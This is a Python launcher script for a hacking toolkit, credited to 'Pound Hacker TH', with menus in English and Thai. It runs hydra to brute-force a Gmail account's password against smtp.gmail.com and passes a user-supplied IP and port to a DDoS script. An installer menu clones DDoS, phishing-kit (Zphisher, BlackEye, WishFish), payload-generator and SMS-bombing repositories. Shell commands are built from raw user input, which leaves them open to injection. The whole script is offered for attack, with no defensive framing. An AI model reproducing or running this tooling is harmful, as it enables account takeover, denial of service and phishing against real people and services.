## IMPORT
import os, sys, time
def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
##
class Color:
        เขียว = '\033[92m'
        เหลือง = '\033[93m'
        เเดง = '\033[91m'

def ShowTool():
    os.system("clear")
    print(Color.เขียว + ''' 
▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████  ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░   ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
             ░ ░      ░ ░      ░  ░      ░   ░  ░  ░      ░  ░░ ░      ░  ░    ░           ░       ░ 
                                                              ░
''')
    print(Color.เหลือง + "~[1] Tools METASEC ")
    print(Color.เหลือง + "~[2] Tools Planetwork-DDOS ")
    print(Color.เหลือง + "~[3] Tools XTRACK ")
    print(Color.เหลือง + "~[4] Tools DDos-Attack ")
    print(Color.เหลือง + "~[5] Tools SocialSploit ")
    print(Color.เหลือง + "~[6] Tools WishFish ")
    print(Color.เหลือง + "~[7] Tools PayGen ")
    print(Color.เหลือง + "~[8] Tools DDos ")
    print(Color.เหลือง + "~[9] Tools HPAS1319 ")
    print(Color.เหลือง + "~[10] Tools TBomb ")
    print(Color.เหลือง + "~[11] Tools Zphisher ")
    print(Color.เหลือง + "~[12] Tools BalckEye ")
    print("")
    print(Color.เหลือง + "~[13] Go Back ")
    print(Color.เหลือง + "~[00] Exit ")
    print("")
    Select = input(Color.เหลือง + "~[ToolsSelect]--> ")

    if Select == "1" or Select == "01":
       os.system("figlet METASEC | lolcat")
       print("")
       os.system("pkg install unstable-repo -y ")
       os.system("pkg install metasploit -y")
       os.system("pkg install python2 -y")
       os.system("pkg install git")
       os.system("git clone https://github.com/malw4r3/METASEC")
       sys.exit()
    elif Select == "2" or Select == "02":
         os.system("figlet Planetwork-DDOS | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/Hydra7/Planetwork-DDOS")
         sys.exit()
    elif Select == "3" or Select == "03":
         os.system("figlet XTRACK | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/MALW4R3/XTRACK")
         sys.exit()
    elif Select == "4" or Select == "04":
         os.system("figlet DDos-Attack | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/Ha3MrX/DDos-Attack")
         sys.exit()
    elif Select == "5" or Select == "05":
         os.system("figlet SocialSploit | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/Cesar-Hack-Gray/SocialSploit")
         sys.exit()
    elif Select == "6" or Select == "06":
         os.system("figlet WishFish | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("pkg install php -y")
         os.system("pkg install wget -y")
         os.system("pkg install openssh -y")
         os.system("git clone https://github.com/kinghacker0/WishFish")
         sys.exit()
    elif Select == "7" or Select == "07":
         os.system("figlet PayGen | lolcat")
         print("")
         os.system("pkg update -y")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/shadowwalker005/paygen")
         sys.exit()
    elif Select == "8" or Select == "08":
         os.system("figlet DDos | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/Bell-A-7KA/DDos")
         sys.exit()
    elif Select == "9" or Select == "09":
         os.system("figlet HPAS1319 | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/DedSecCyber/HPAS1369")
         sys.exit()
    elif Select == "10":
         os.system("figlet TBomb | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/TheSpeedX/TBomb")
         sys.exit()
    elif Select == "11":
         os.system("figlet Zphisher | lolcat")
         print("")
         os.system("apt update -y")
         os.system("apt install git curl php wget -y")
         os.system("git clone git://github.com/htr-tech/zphisher.git")
         sys.exit()
    elif Select == "12":
         os.system("figlet BalckEye | lolcat")
         print("")
         os.system("pkg install git -y")
         os.system("git clone https://github.com/An0nUD4Y/blackeye")
         sys.exit()
    elif Select == "13":
         print("")
         print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
         print("")
         print(Color.เเดง + '               Go Back                 ')
         print("")
         print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
         print("")
         time.sleep(1)
         restart_program()
    elif Select == "00" or Select == "0":
         print("")
         print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
         print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
         print("")
         print(Color.เหลือง + '              THANK                 ')
         print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
         print("")
         time.sleep(1)
         sys.exit()
    else:
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               ERROR                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

def InstallToolsHacking():
    os.system("clear")
    print(Color.เขียว + '''
 _____          _        _ _ _____           _      _   _            _    _
|_   _|        | |      | | |_   _|         | |    | | | |          | |  (_)
  | | _ __  ___| |_ __ _| | | | | ___   ___ | |___ | |_| | __ _  ___| | ___ _ __   __ _
  | || '_ \/ __| __/ _` | | | | |/ _ \ / _ \| / __||  _  |/ _` |/ __| |/ / | '_ \ / _` |
 _| || | | \__ \ || (_| | | | | | (_) | (_) | \__ \| | | | (_| | (__|   <| | | | | (_| |
 \___/_| |_|___/\__\__,_|_|_| \_/\___/ \___/|_|___/\_| |_/\__,_|\___|_|\_\_|_| |_|\__, |
                                                                                   __/ |
                                                                                  |___/
''')


    print(Color.เหลือง + "~[1] Show Tool")
    print("")
    print(Color.เหลือง + "~[2] Go Back ")
    print(Color.เหลือง + "~[0] Exit ")
    print("")
    Select = input(Color.เหลือง + "~[Select]--> ")
    if Select == "1" or Select == "01":
       ShowTool()

    elif Select == "2" or Select == "02":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               Go Back                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

    elif Select == "0" or Select == "00":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
     print("")
     print(Color.เหลือง + '              THANK                 ')
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     sys.exit()

    else:
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               ERROR                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()


def BruteForceGmail():
    os.system("clear")
    print(Color.เขียว + '''
 /$$$$$$$                        /$$               /$$$$$$$$                                       /$$$$$$                          /$$ /$$
| $$__  $$                      | $$              | $$_____/                                      /$$__  $$                        |__/| $$
| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ | $$     /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ | $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$
| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$| $$$$$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$| $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$
| $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$| $$__/| $$  \ $$| $$  \__/| $$      | $$$$$$$$| $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$
| $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/| $$   | $$  | $$| $$      | $$      | $$_____/| $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$
| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$   |  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$
|_______/ |__/       \______/    \___/   \_______/|__/    \______/ |__/       \_______/ \_______/ \______/ |__/ |__/ |__/ \_______/|__/|__/
''')
    print("")
    Email = input(Color.เหลือง + " ~[Email]--> ")
    print("")
    Wordlist = input(Color.เหลือง + " ~[Wordlist]--> ")
    os.system("")
    os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (Email, Wordlist))
    print("")
    print(Color.เหลือง + ' [1] Go Back  ')
    print(Color.เหลือง + ' [0] Exit ')
    print("")
    Select = input(Color.เขียว + " ~[Select]--> ")

    if Select == "1" or Select == "01":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               Go Back                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

    elif Select == "2" or Select == "02":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
     print("")
     print(Color.เหลือง + '              THANK                 ')
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     sys.exit()

    else:
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               ERROR                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

def EXIFTOOL():
     os.system("clear")
     print(Color.เหลือง + "            			   EXIFTOOL 			  ")
     print(Color.เขียว +   '''           .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX   Created by Pound Hacker TH
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
''')

     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print(Color.เเดง + ' (ความสามารถของEXIFTOOL) ดูที่อยู่รูปภาพได้ เเละอื่นๆ ')
     print("")
     print(Color.เเดง + ' (วิธีใช้งาน) /sdcard/ชื่อรูปภาพ ')
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     AddressImage = input(Color.เขียว + "~[AddressImage]--> ")
     os.system("clear")
     os.system(" exiftool %s " % (AddressImage))
     print("")
     print(Color.เหลือง + ' [1] Go Back  ')
     print(Color.เหลือง + ' [0] Exit ')
     print("")
     Select = input(Color.เขียว + " ~[Select]--> ")

     if Select == "1" or Select == "01":
      print("")
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print("")
      print(Color.เเดง + '               Go Back                 ')
      print("")
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print("")
      time.sleep(1)
      restart_program()

     elif Select == "0" or Select == "00":
      print("")
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
      print("")
      print(Color.เหลือง + '              THANK                 ')
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print("")
      time.sleep(1)
      sys.exit()

     else:
      print("")
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print("")
      print(Color.เเดง + '               ERROR                 ')
      print("")
      print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
      print("")
      time.sleep(1)
      restart_program()

def BruteForce():
     os.system("clear")
     print(Color.เขียว + '''   .___.
          /)               ,-^     ^-.
         //               /           \
.-------| |--------------/  __     __  \-------------------.__
|WMWMWMW| |>>>>>>>>>>>>> | />>\   />>\ |>>>>>>>>>>>>>>>>>>>>>>:>
`-------| |--------------| \__/   \__/ |-------------------'^^
         \\               \    /|\    /
          \)               \   \_/   /
                            |       |
                            |+H+H+H+|
                            \       /
                             ^-----^    Created by Pound Hacker TH
''')

     print(Color.เหลือง + "    [1] BruteForce Gmail")
     print("")
     print(Color.เหลือง + "    [9] Go Back ")
     print(Color.เหลือง + "    [0] Exit ")
     print("")
     Select = input(Color.เขียว + "~[Select]--> ")

     if Select == "1" or Select == "01":
        BruteForceGmail()

     elif Select == "9" or Select == "09":
        print("")
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print("")
        print(Color.เเดง + '               Go Back                 ')
        print("")
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print("")
        time.sleep(1)
        restart_program()

     elif Select == "0" or Select == "00":
        print("")
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
        print("")
        print(Color.เหลือง + '              THANK                 ')
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print("")
        time.sleep(1)
        sys.exit()

     else:
        print("")
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print("")
        print(Color.เเดง + '               ERROR                 ')
        print("")
        print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
        print("")
        time.sleep(1)
        restart_program()

def NMAP():
    os.system("clear")
    print(Color.เขียว + '''

 /$$   /$$ /$$      /$$  /$$$$$$  /$$$$$$$ 
| $$$ | $$| $$$    /$$$ /$$__  $$| $$__  $$
| $$$$| $$| $$$$  /$$$$| $$  \ $$| $$  \ $$
| $$ $$ $$| $$ $$/$$ $$| $$$$$$$$| $$$$$$$/
| $$  $$$$| $$  $$$| $$| $$__  $$| $$____/
| $$\  $$$| $$\  $ | $$| $$  | $$| $$
| $$ \  $$| $$ \/  | $$| $$  | $$| $$
|__/  \__/|__/     |__/|__/  |__/|__/
''')

    print("")
    IP = input(Color.เหลือง + " ~[IP]--> ")
    os.system("clear")
    os.system(" nmap %s " % (IP))
    print("")
    print(Color.เหลือง + ' [1] Go Back  ')
    print(Color.เหลือง + ' [0] Exit ')
    print("")
    Select = input(Color.เขียว + " ~[Select]--> ")

    if Select == "1" or Select == "01":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               Go Back                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

    elif Select == "0" or Select == "00":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
     print("")
     print(Color.เหลือง + '              THANK                 ')
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     sys.exit()

    else:
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               ERROR                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

def DDosAttack():
    os.system("clear")
    print(Color.เเดง + ''' 
 /$$$$$$$  /$$$$$$$                       /$$$$$$    /$$     /$$                         /$$
| $$__  $$| $$__  $$                     /$$__  $$  | $$    | $$                        | $$
| $$  \ $$| $$  \ $$  /$$$$$$   /$$$$$$$| $$  \ $$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$| $$   /$$
| $$  | $$| $$  | $$ /$$__  $$ /$$_____/| $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/
| $$  | $$| $$  | $$| $$  \ $$|  $$$$$$ | $$__  $$  | $$    | $$      /$$$$$$$| $$      | $$$$$$/
| $$  | $$| $$  | $$| $$  | $$ \____  $$| $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$
| $$$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/| $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \  $$
|_______/ |_______/  \______/ |_______/ |__/  |__/   \___/   \___/   \_______/ \_______/|__/  \__/

''')

    print("")
    IP = input(Color.เหลือง + " ~[IP]--> ")
    print("")
    PORT = input(Color.เหลือง + " ~[PORT]--> ")
    print("")
    Packet = input(Color.เหลือง + " ~[Packet]--> ")
    os.system("python2 DDosAttack %s %s %s" % (IP, PORT, Packet))
    print(Color.เขียว + '''
 /$$$$$$$$ /$$           /$$           /$$
| $$_____/|__/          |__/          | $$
| $$       /$$ /$$$$$$$  /$$  /$$$$$$$| $$$$$$$
| $$$$$   | $$| $$__  $$| $$ /$$_____/| $$__  $$
| $$__/   | $$| $$  \ $$| $$|  $$$$$$ | $$  \ $$
| $$      | $$| $$  | $$| $$ \____  $$| $$  | $$
| $$      | $$| $$  | $$| $$ /$$$$$$$/| $$  | $$
|__/      |__/|__/  |__/|__/|_______/ |__/  |__/
''')
    print("")
    print(Color.เหลือง + ' [1] Go Back  ')
    print(Color.เหลือง + ' [0] Exit ')
    print("")
    Select = input(Color.เขียว + " ~[Select]--> ")

    if Select == "1" or Select == "01":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               Go Back                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

    elif Select == "0" or Select == "00":
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
     print("")
     print(Color.เหลือง + '              THANK                 ')
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     sys.exit()

    else:
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     print(Color.เเดง + '               ERROR                 ')
     print("")
     print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
     print("")
     time.sleep(1)
     restart_program()

os.system("clear")
print(Color.เหลือง + "                              NPC01        ")
print(Color.เขียว + '''
                             _______                      _
   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
  dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
  V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
           `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
            `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
       __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
     ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
 <MMP'     `~YMMa_   YOOo   •  OOO  •   oOOP   _adMP~'      `YMM>
              `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
      ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
    ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
   ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
   MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
      `'                  `OObNNNNNdOO'                   `'
                            `~OOOOO~'     Created by Pound Hacker TH''')

print("")
print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print(Color.เเดง + ' Author  : Pound Hacker TH ')
print(Color.เเดง + ' Group   : PlusX HK ')
print(Color.เเดง + ' Version : 1.0 ')
print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print("")
print(Color.เหลือง + '  ~[1] EXIFTOOl ')
print("")
print(Color.เหลือง + '  ~[2] Brute Force ')
print("")
print(Color.เหลือง + '  ~[3] NMAP ')
print("")
print(Color.เหลือง + '  ~[4] DDosAttack ')
print("")
print(Color.เหลือง + '  ~[5] Install Tools Hacking ')
print("")
print(Color.เหลือง + '  ~[0] Exit ')
print("")
Select = input(Color.เขียว + " ~[Select]--> ")

if Select == "1" or Select == "01":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '               EXIFTOOL                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   EXIFTOOL()

elif Select == "2" or Select == "02":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '            BruteForce                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   BruteForce()

elif Select == "3" or Select == "03":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '             NMAP                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   NMAP()

elif Select == "4" or Select == "04":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '             DDosAttack                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   DDosAttack()

elif Select == "5" or Select == "05":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '          InstallToolHacking                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   InstallToolsHacking()

elif Select == "0" or Select == "00":
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print(Color.เเดง + ' NPC01 Created by Pound Hacker TH    ')
   print("")
   print(Color.เหลือง + '              THANK                 ')
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   sys.exit()

else:
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   print(Color.เเดง + '               ERROR                 ')
   print("")
   print(Color.เหลือง + ' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ')
   print("")
   time.sleep(1)
   restart_program()


